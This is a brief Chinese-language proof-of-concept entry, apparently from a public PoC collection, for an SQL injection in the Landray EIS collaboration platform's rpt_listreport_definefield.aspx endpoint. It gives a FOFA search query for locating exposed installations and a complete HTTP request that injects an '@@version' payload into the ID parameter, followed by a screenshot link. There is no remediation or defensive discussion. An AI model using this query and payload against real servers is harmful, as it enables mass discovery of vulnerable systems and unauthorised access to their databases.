## 蓝凌EIS智慧协同平台rpt_listreport_definefield.aspx接口存在SQL注入漏洞

## fofa
```
icon_hash="953405444"||app="Landray-OA系统"
```


## poc
```
GET /SM/rpt_listreport_definefield.aspx?ID=2%20and%201=@@version--+ HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Upgrade-Insecure-Requests: 1
```

![8353ecc402034f2c617f991e8081a2b3](https://github.com/wy876/POC/assets/139549762/56cffa50-5864-49b4-bd42-f1b77b71214b)
